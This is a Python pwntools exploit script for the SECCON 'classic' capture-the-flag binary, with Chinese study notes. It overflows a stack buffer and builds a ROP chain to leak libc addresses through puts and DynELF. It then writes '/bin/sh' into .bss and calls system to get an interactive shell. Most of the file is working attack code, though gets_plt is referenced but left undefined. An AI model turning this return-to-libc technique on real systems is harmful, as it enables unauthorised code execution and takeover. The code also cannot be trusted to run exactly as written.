# encoding:utf-8
# 找个模板和流程 编写
# ROP 绕过 NX，ASLR 保护
# 参考：http://binarysec.top/post/2018-01-30-1.html

# libc.so 加载基地址如何知道
# 给了 libc-2.23.so 作用：给出libc使用的环境，并不能简单的知道基地址
# 通常使用泄露技术，结合pwntool的DynELF模块，需要一个输入函数和输出函数
# http://wooyun.jozxing.cc/static/drops/papers-7551.html
# read、write、puts、gets、scanf、printf
"""
linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。
但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。
其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,
但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，
如果还有更多的参数的话才会保存在栈上!!!!!!!!!!!!!!!!!!!!!!!!!!!!
"""
# EIP 指向地址执行，和指向 call 函数执行区别！后者多了一个入栈下一条指令的操作
# 得到 libc.so 
from pwn import *

# 设置本地处理还是远程
local = 1

# 开启 debud 模式
# context.log_level = 'debug'

# elf = ELF('./classic')
# # 输出函数
# puts_plt = elf.symbols['puts']
# # 输入函数
# gets_plt = elf.symbols['gets']
# GDB 调试看到的 put@plt 位置  也可以用 IDA 找到 call puts@plt 即可
puts_plt = 0x400520 

# 漏洞函数的地址
# https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.8_dynelf.html
vuln_addr = 0x4006A9 # 这里填写漏洞函数里面汇编第一个地址

poprdi_ret = 0x400753 # pop rdi ; ret  # ROPgadget --binary classic --only 'pop|ret'
"""
send(data) : 发送数据
sendline(data) : 发送一行数据，相当于在末尾加\n
recv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时
recvline(keepends=True) : 接收到\n，keepends指定保留\n
"""

def leak(address):
    # _cdecl（c/c++默认调用方式）
    # puts 方式需要有\0字符结束，会自动将“n”追加到输出字符串的末尾，很烦！最好用write/read之类的
    # puts 函数 编写 leak 教程 https://www.anquanke.com/post/id/85129
    payload1 = 'a'*(48+24) + p64(poprdi_ret) + p64(address) + p64(puts_plt) + p64(vuln_addr)# 不对，参数不是通过栈布局的
    p.sendline(payload1)
    # 在 recv 前释放完输出！！观察这个漏洞函数输入之后还有没有输出
    print p.recvuntil('Have a nice pwn!!\n')
    # data = p.recv(8) # write 函数的写法
    # #--360 安全客辣鸡作者的写法
    # count = 0
    # up = ""
    # buf = ""
    # while True:
    #     c = p.recv(numb=1, timeout=1) 
    #     count += 1
    #     if up == '\n' and c == "": #接收到的上一个字符为回车符，而当前接收不到新字符，则
    #         buf = buf[:-1]        #删除puts函数输出的末尾回车符
    #         buf += "\0"
    #         break
    #     else:
    #         buf += c
    #     up = c
    # data = buf[:8]  #取指定字节数
    s = p.recvuntil("\n")
    data = s[:8]
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data
# 严格注意 gets  puts 的\n 问题，缓冲区
# https://www.cnblogs.com/xiaofengkang/archive/2011/05/20/2052452.html
# 也可能 puts 遇到 0a 了，唉

p = process('./classic', env = {'LD_PRELOAD': './libc-2.23.so'})
d = DynELF(leak, elf=ELF('./classic'))
# 436c617373696320  Classic空格


# ROP 核心
# 特别注意观察程序是否给了漏洞函数，以及溢出部分的汇编代码是否具有特点

# ------------------------------ 如果能找到'bin/sh'字符串
# 需要 pop adi ; ret
# gadget_addr = 0x400753  # ROPgadget 搜索 rdi
# # 需要关键字符串 '/bin/sh'
# bin_sh_addr = 
# # 需要System function
# # libc 通常有
# system_addr = d.lookup('system', 'libc')

# ------------------------------ 如果不能找到 /bin/sh 字符串
# 参数调用方式，以及函数是如何平衡堆栈的，函数内还是函数外，这个一调试就知道了；但是也可以补充基本知识
# 參考链接的使用read，read函数有三个参数，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡
# 我们用的是 gets_plt 只有一个 参数，需要 pop ret 即可
# gets 函数会读入\n吗？

bss_addr = 0x0601060  # IDA segment ，选择 .bss 的 start 地址
system_addr = d.lookup('system', 'libc')
payload2 = 'a'*(48+24) + p64(poprdi_ret) + p64(bss_addr) + p64(gets_plt) + p64(poprdi_ret) + p64(bss_addr) + p64(system_addr) + p64(vuln_addr) 
p.send(payload2)
p.send('/bin/sh\0')
p.interactive()

# 这次 seccon classic writeup 官方 显示 可以直接顺序写二个payload做完你需要的事情